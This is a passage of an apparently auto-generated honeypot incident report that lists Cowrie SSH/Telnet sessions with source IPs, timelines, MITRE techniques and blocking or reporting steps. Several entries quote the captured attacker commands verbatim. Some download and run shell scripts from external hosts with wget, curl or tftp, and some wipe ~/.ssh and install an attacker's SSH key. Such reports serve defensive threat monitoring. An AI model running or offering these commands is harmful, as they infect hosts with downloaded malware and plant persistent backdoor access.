| `2026-08-25 10:00:01` | `cowrie.log.closed` |
| `2026-08-25 10:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e31b781b3c45

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 10:00 |
| **Last Seen** | 2026-08-25 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:00:01` | `cowrie.session.connect` |
| `2026-08-25 10:00:02` | `cowrie.login.success` |
| `2026-08-25 10:00:02` | `cowrie.session.params` |
| `2026-08-25 10:00:02` | `cowrie.command.input` |
| `2026-08-25 10:00:02` | `cowrie.command.success` |
| `2026-08-25 10:00:03` | `cowrie.log.closed` |
| `2026-08-25 10:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e323a9560595

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 10:00 |
| **Last Seen** | 2026-08-25 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:00:03` | `cowrie.session.connect` |
| `2026-08-25 10:00:03` | `cowrie.login.success` |
| `2026-08-25 10:00:04` | `cowrie.session.params` |
| `2026-08-25 10:00:04` | `cowrie.command.input` |
| `2026-08-25 10:00:04` | `cowrie.command.success` |
| `2026-08-25 10:00:04` | `cowrie.log.closed` |
| `2026-08-25 10:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-298decb08369

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-25 10:02 |
| **Last Seen** | 2026-08-25 10:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:02:21` | `cowrie.session.connect` |
| `2026-08-25 10:02:21` | `cowrie.telnet.option` |
| `2026-08-25 10:02:21` | `cowrie.login.success` |
| `2026-08-25 10:02:22` | `cowrie.session.params` |
| `2026-08-25 10:02:22` | `cowrie.telnet.option` |
| `2026-08-25 10:02:22` | `cowrie.telnet.option` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.failed` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.success` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.failed` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.success` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.failed` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.success` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.command.failed` |
| `2026-08-25 10:02:22` | `cowrie.command.input` |
| `2026-08-25 10:02:22` | `cowrie.log.closed` |
| `2026-08-25 10:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-634c2855ecd5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-25 10:03 |
| **Last Seen** | 2026-08-25 10:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:03:30` | `cowrie.session.connect` |
| `2026-08-25 10:03:30` | `cowrie.client.version` |
| `2026-08-25 10:03:30` | `cowrie.client.kex` |
| `2026-08-25 10:03:31` | `cowrie.login.success` |
| `2026-08-25 10:03:31` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:03:31` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-216e3bef3f7b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:05 |
| **Last Seen** | 2026-08-25 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:05:56` | `cowrie.session.connect` |
| `2026-08-25 10:05:56` | `cowrie.client.version` |
| `2026-08-25 10:05:56` | `cowrie.client.kex` |
| `2026-08-25 10:05:57` | `cowrie.login.success` |
| `2026-08-25 10:05:57` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:05:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:05:57` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68093e506521

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:06 |
| **Last Seen** | 2026-08-25 10:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:06:00` | `cowrie.session.connect` |
| `2026-08-25 10:06:00` | `cowrie.client.version` |
| `2026-08-25 10:06:00` | `cowrie.client.kex` |
| `2026-08-25 10:06:01` | `cowrie.login.success` |
| `2026-08-25 10:06:02` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:06:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:06:02` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:06:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d21c65c9507e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-25 10:13 |
| **Last Seen** | 2026-08-25 10:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:13:16` | `cowrie.session.connect` |
| `2026-08-25 10:13:16` | `cowrie.client.version` |
| `2026-08-25 10:13:16` | `cowrie.client.kex` |
| `2026-08-25 10:13:17` | `cowrie.login.success` |
| `2026-08-25 10:13:17` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:13:17` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d973c2699db

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:15 |
| **Last Seen** | 2026-08-25 10:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:15:34` | `cowrie.session.connect` |
| `2026-08-25 10:15:34` | `cowrie.client.version` |
| `2026-08-25 10:15:34` | `cowrie.client.kex` |
| `2026-08-25 10:15:35` | `cowrie.login.success` |
| `2026-08-25 10:15:35` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:15:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:15:35` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c27e44d9c89

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:15 |
| **Last Seen** | 2026-08-25 10:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:15:37` | `cowrie.session.connect` |
| `2026-08-25 10:15:37` | `cowrie.client.version` |
| `2026-08-25 10:15:37` | `cowrie.client.kex` |
| `2026-08-25 10:15:38` | `cowrie.login.success` |
| `2026-08-25 10:15:38` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:15:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:15:38` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67feeb156a67

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-08-25 10:17 |
| **Last Seen** | 2026-08-25 10:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:17:44` | `cowrie.session.connect` |
| `2026-08-25 10:17:44` | `cowrie.client.version` |
| `2026-08-25 10:17:44` | `cowrie.client.kex` |
| `2026-08-25 10:17:45` | `cowrie.login.success` |
| `2026-08-25 10:17:46` | `cowrie.session.params` |
| `2026-08-25 10:17:46` | `cowrie.command.input` |
| `2026-08-25 10:17:46` | `cowrie.command.failed` |
| `2026-08-25 10:17:47` | `cowrie.log.closed` |
| `2026-08-25 10:17:48` | `cowrie.session.params` |
| `2026-08-25 10:17:48` | `cowrie.command.input` |
| `2026-08-25 10:17:48` | `cowrie.session.file_download` |
| `2026-08-25 10:17:48` | `cowrie.log.closed` |
| `2026-08-25 10:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95e8f9b27ede

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-08-25 10:17 |
| **Last Seen** | 2026-08-25 10:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:17:48` | `cowrie.session.connect` |
| `2026-08-25 10:17:48` | `cowrie.client.version` |
| `2026-08-25 10:17:48` | `cowrie.client.kex` |
| `2026-08-25 10:17:49` | `cowrie.login.success` |
| `2026-08-25 10:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da20ceee7932

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-08-25 10:17 |
| **Last Seen** | 2026-08-25 10:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:17:50` | `cowrie.session.connect` |
| `2026-08-25 10:17:50` | `cowrie.client.version` |
| `2026-08-25 10:17:50` | `cowrie.client.kex` |
| `2026-08-25 10:17:51` | `cowrie.login.success` |
| `2026-08-25 10:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-492ac953b6b0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:25 |
| **Last Seen** | 2026-08-25 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:25:07` | `cowrie.session.connect` |
| `2026-08-25 10:25:07` | `cowrie.client.version` |
| `2026-08-25 10:25:07` | `cowrie.client.kex` |
| `2026-08-25 10:25:08` | `cowrie.login.success` |
| `2026-08-25 10:25:08` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:25:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:25:08` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab12604c51c3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:25 |
| **Last Seen** | 2026-08-25 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:25:10` | `cowrie.session.connect` |
| `2026-08-25 10:25:10` | `cowrie.client.version` |
| `2026-08-25 10:25:11` | `cowrie.client.kex` |
| `2026-08-25 10:25:11` | `cowrie.login.success` |
| `2026-08-25 10:25:12` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:25:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:25:12` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d86e15816240

| Field | Detail |
|---|---|
| **Source IP** | `106.243.155[.]71` |
| **First Seen** | 2026-08-25 10:28 |
| **Last Seen** | 2026-08-25 10:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:28:37` | `cowrie.session.connect` |
| `2026-08-25 10:28:37` | `cowrie.client.version` |
| `2026-08-25 10:28:37` | `cowrie.client.kex` |
| `2026-08-25 10:28:38` | `cowrie.login.success` |
| `2026-08-25 10:28:39` | `cowrie.session.params` |
| `2026-08-25 10:28:39` | `cowrie.command.input` |
| `2026-08-25 10:28:39` | `cowrie.command.failed` |
| `2026-08-25 10:28:39` | `cowrie.log.closed` |
| `2026-08-25 10:28:40` | `cowrie.session.params` |
| `2026-08-25 10:28:40` | `cowrie.command.input` |
| `2026-08-25 10:28:40` | `cowrie.session.file_download` |
| `2026-08-25 10:28:40` | `cowrie.log.closed` |
| `2026-08-25 10:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.243.155[.]71` to AbuseIPDB if not already reported
- [ ] Block `106.243.155[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2798958faad6

| Field | Detail |
|---|---|
| **Source IP** | `106.243.155[.]71` |
| **First Seen** | 2026-08-25 10:28 |
| **Last Seen** | 2026-08-25 10:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:28:41` | `cowrie.session.connect` |
| `2026-08-25 10:28:41` | `cowrie.client.version` |
| `2026-08-25 10:28:41` | `cowrie.client.kex` |
| `2026-08-25 10:28:42` | `cowrie.login.success` |
| `2026-08-25 10:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.243.155[.]71` to AbuseIPDB if not already reported
- [ ] Block `106.243.155[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbf54c63f15e

| Field | Detail |
|---|---|
| **Source IP** | `106.243.155[.]71` |
| **First Seen** | 2026-08-25 10:28 |
| **Last Seen** | 2026-08-25 10:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:28:42` | `cowrie.session.connect` |
| `2026-08-25 10:28:42` | `cowrie.client.version` |
| `2026-08-25 10:28:42` | `cowrie.client.kex` |
| `2026-08-25 10:28:43` | `cowrie.login.success` |
| `2026-08-25 10:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.243.155[.]71` to AbuseIPDB if not already reported
- [ ] Block `106.243.155[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e459cf036e2a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:34 |
| **Last Seen** | 2026-08-25 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:34:38` | `cowrie.session.connect` |
| `2026-08-25 10:34:38` | `cowrie.client.version` |
| `2026-08-25 10:34:38` | `cowrie.client.kex` |
| `2026-08-25 10:34:39` | `cowrie.login.success` |
| `2026-08-25 10:34:39` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:34:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:34:39` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c061d1c5a239

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:34 |
| **Last Seen** | 2026-08-25 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:34:41` | `cowrie.session.connect` |
| `2026-08-25 10:34:41` | `cowrie.client.version` |
| `2026-08-25 10:34:41` | `cowrie.client.kex` |
| `2026-08-25 10:34:42` | `cowrie.login.success` |
| `2026-08-25 10:34:42` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:34:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:34:42` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5edc2163d918

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 10:44 |
| **Last Seen** | 2026-08-25 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:44:13` | `cowrie.session.connect` |
| `2026-08-25 10:44:13` | `cowrie.client.version` |
| `2026-08-25 10:44:13` | `cowrie.client.kex` |
| `2026-08-25 10:44:14` | `cowrie.login.success` |
| `2026-08-25 10:44:14` | `cowrie.direct-tcpip.request` |
| `2026-08-25 10:44:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 10:44:14` | `cowrie.direct-tcpip.data` |
| `2026-08-25 10:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
